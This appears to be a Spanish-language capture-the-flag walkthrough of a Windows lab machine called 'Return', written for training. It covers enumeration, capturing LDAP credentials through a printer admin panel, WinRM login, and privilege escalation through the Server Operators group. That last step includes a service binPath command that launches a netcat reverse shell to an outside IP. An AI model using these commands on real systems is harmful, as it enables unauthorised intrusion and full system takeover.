## Resumen
Return es una máquina Windows de dificultad sencilla con un panel de administración de impresoras de red que almacena credenciales LDAP. Estas credenciales pueden ser capturadas mediante un servidor LDAP malicioso, lo que permite obtener acceso al servidor a través del servicio WinRM. Se descubrió que el usuario pertenecía a un grupo con privilegios que fue explotado para obtener acceso al sistema.
## Herramientas



## Enumeración

Empezamos haciendo un escaneo de puertos completo y se puede observar la estructura que suelen tener los sistemas Windows. Hay puertos interesantes como el 80, 445... 
```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.95.241
```

![](/img/Pasted%20image%2020260507152904.png) 

En el escaneo de versiones podemos ver algo interesante como que el Host se llama PRINTER, lo que apunta a haber algún servicio de impresora

```bash
sudo nmap -sCV 10.129.95.241
```

![](/img/Pasted%20image%2020260507153242.png)

Intentado entrar como anónimo en el servicio de SMB nos deniega el acceso, así que de momento no tenemos nada que hacer son esto

```bash
smbmap -u Guest -p "" -H 10.129.95.241
```

![](/img/Pasted%20image%2020260507153405.png)

Entrando al servicio web del puerto 80 podemos ver una página de impresoras, además de que estamos en el Admin Panel, por lo que veremos hasta dónde podemos llegar con este privilegio


![](Pasted%20image%2020260507153529.png)


Entrando al apartado "Settings" encontramos un usuario, el puerto por el que está el servicio de impresora, lo cuál seguramente sirva  

![](/img/Pasted%20image%2020260507153718.png)

Haciendo fuzzing no encuentro nada fuera de lo común así que no podemos mirar más desde la web, así que pasaremos a ver que hay en ese puerto del server

```bash
gobuster dir --url http://10.129.95.241/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt
```

![](/img/Pasted%20image%2020260507154059.png)


## Explotación
Si cambiamos el server address a nuestra IP tun0 y le damos a update mientras escuchamos con netcat a ese puerto, conseguiremos que nos envíen la información de las credenciales del usuario svc-printer


![](/img/Pasted%20image%2020260507154927.png)

![](/img/Pasted%20image%2020260507155008.png) 

Ahora simplemente con la aplicación evil-winrm probaremos a iniciar sesión con la contraseña previamente conseguida y entraremos exitosamente al sistema

![](/img/Pasted%20image%2020260507155238.png)

Tendremos acceso a la primer flag de la máquina

![](/img/Pasted%20image%2020260507155614.png)
## Escalada de privilegios

Viendo que tipos de privilegios se puede ver que tenemos algunos bastantes interesantes e importantes

![](/img/Pasted%20image%2020260507155455.png) 

También mirando los grupos a los que pertenece vemos muchos con peso, pero en especial Server Operators, con lo que atacaremos ahí

>[!Sever Operators]
>El grupo de Server Operators es un grupo de usuarios especial que suele tener acceso a comandos y configuraciones avanzadas en un sistema informático. Este grupo se utiliza normalmente para administrar un servidor o solucionar problemas del sistema. Los Sever Operators suelen ser responsables de supervisar el rendimiento del servidor, gestionar la seguridad del sistema y proporcionar soporte técnico a los usuarios. También pueden supervisar la instalación de actualizaciones de software, la creación y el mantenimiento de cuentas de usuario y la realización de tareas de mantenimiento rutinarias.


![](/img/Pasted%20image%2020260507155823.png)

Para ejecutar el escalado de privilegios debemos subir el programa nc.exe 

![](/img/Pasted%20image%2020260507160524.png) 

Después miré los servicios para tener un camino hacía donde ejecutar el exploit e introducírselo, vi VMware Tools

![](/img/Pasted%20image%2020260507160749.png) 


Con lo que debemos de poner el siguiente comando, visto en la siguiente guía https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/, en ese servicio metiéndole como binPath el programa que hemos subido con nuestra ip y puerto hacía el que queremos que vaya, lo que hará que se ejecute al iniciar el programa

```powershell
sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.180 1234"
```

![](/img/Pasted%20image%2020260507161033.png) 

Ahora debemos reiniciar el programa parándolo e iniciándolo mientras escuchamos con nuestro netcat

![](/img/Pasted%20image%2020260507161234.png)

Y habremos conseguido con éxito el acceso al sistema con privilegios, con lo cuál finalizaremos la máquina llegando a última flag de root.txt. La shell puede llegar a ser inestable y cerrarse

![](/img/Pasted%20image%2020260507161618.png)


